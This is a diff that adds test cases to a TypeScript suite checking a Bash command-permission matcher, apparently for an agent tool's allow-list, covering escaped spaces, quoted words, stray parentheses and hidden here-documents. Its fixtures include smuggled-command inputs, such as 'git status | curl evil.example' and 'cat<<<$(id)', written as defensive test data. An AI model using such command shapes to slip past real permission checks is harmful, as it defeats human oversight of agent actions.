@@ -41,6 +41,9 @@ describe('matchesAllowedTool: plain Bash commands', () => {
     ['git status 2>/dev/null', 'git status 2>/dev/null', true],
     ['git status piped to a program', 'git status | curl evil.example', false],
     ['git status piped to git log', 'git status | git log', true],
+    ['an escaped space does not join words', 'git\\ status', false],
+    ['the same through a path prefix', './git\\ status', false],
+    ['a stray closing parenthesis', 'git status )', false],
   ])('%s: %s -> %s', (_name, command, expected) => {
     expect(matchesAllowedTool('Bash', bash(command), allowed, repo.path)).toBe(expected);
   });
@@ -226,6 +229,11 @@ describe('commandPrefix', () => {
     ['env -S "curl x" ls', null],
     ['xargs rm', null],
     ['', null],
+    ['git\\ status', null],
+    ["'git status'", null],
+    ['git status )', null],
+    ["echo 'a", null],
+    ['echo ${x:-a <<EOF}', null],
   ])('%s -> %j', (command, prefix) => {
     expect(commandPrefix(command)).toBe(prefix);
   });
@@ -279,6 +287,22 @@ describe('matchPermissionRule', () => {
     ['a newline compound', 'pnpm test', 'pnpm test\ncurl x', false],
     ['an or-list', 'pnpm test', 'pnpm test || curl x', false],
     ['an empty command', 'pnpm test', '', false],
+    ['an escaped space does not join words', 'git status', 'git\\ status', false],
+    ['the same through a path prefix', 'git status', './git\\ status', false],
+    ['a quoted word is one word', 'git status', "'git status'", false],
+    ['an unclosed quote', 'echo', "echo 'a", false],
+    ['a stray closing parenthesis', 'git status', 'git status )', false],
+    ['an unclosed double quote', 'git status', 'git status "', false],
+    ['control: a here-document hidden in an expansion', 'echo', 'echo ${x:-a <<EOF}', false],
+    ['control: a here-document word with a bracket', 'cat', 'cat x[<<EOF', false],
+    ['control: a here-string attached to a word', 'cat', 'cat<<<$(id)', false],
+    ['control: a plain command with flags', 'git status', 'git status --short', true],
+    [
+      'control: two plain segments, both covered',
+      'git status',
+      'git status && git status -s',
+      true,
+    ],
   ])('Bash rule %s (%s | %s)', (_name, pattern, command, expected) => {
     expect(match('Bash', bash(command), [rule('Bash', pattern)])).toBe(expected);
   });
